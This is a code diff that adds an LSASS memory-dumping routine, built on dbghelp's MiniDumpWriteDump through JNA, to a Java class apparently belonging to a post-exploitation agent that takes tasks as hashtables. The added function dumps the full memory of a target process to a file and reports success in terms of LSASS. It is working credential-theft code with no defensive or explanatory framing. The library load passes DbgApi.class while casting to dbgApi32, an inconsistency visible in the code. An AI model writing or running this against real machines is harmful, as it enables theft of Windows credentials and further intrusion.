@@ -17,6 +17,42 @@ import static com.sun.jna.platform.win32.WinUser.MAPVK_VSC_TO_VK_EX;
 
 public class windows {
 
+    static dbgApi32 winDbg = (dbgApi32) Native.loadLibrary("C:\\Windows\\System32\\dbghelp.dll",DbgApi.class);
+    interface dbgApi32 extends StdCallLibrary {
+	    public boolean MiniDumpWriteDump(WinNT.HANDLE hProcess, long processID, WinNT.HANDLE hFile, long DumpType, long ExceptionParam, long UserStreamParam, long CallBackParam);
+    }
+    
+    public static Hashtable invokeMinidump(Hashtable args) {
+        Hashtable taskOut = new Hashtable();
+        String miniOut = new String();
+        
+        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+
+            int pid = Integer.parseInt(args.get("pid").toString());
+            String dmpOut = args.get("outfile").toString();
+            
+            WinNT.HANDLE hProc = Util.getProcHandle(pid);
+            WinNT.HANDLE hFile = Util.getFileHandle(dmpOut);
+            
+            boolean dmpResult = false; 
+            
+            try {
+                dmpResult = winDbg.MiniDumpWriteDump(hProc,pid,hFile,(long)2,(long)0,(long)0,(long)0);
+            } catch(java.lang.Error possibleMemError) {
+                miniOut = "memory error - unable to dump LSASS memory";
+            }
+
+            if (dmpResult == false) {
+                miniOut = "unknown error - unable to dump LSASS memory";
+            } else {
+                miniOut = String.format("LSASS memory dumped to %s",dmpOut);
+            }
+        } else {
+            miniOut = "error - operating system not compatible with this directive";
+        }
+        taskOut.put("output", miniOut);
+        return taskOut;
+    }
 
     public static Hashtable wmiHotfix(Hashtable args) {
         String wmiOut = new String();
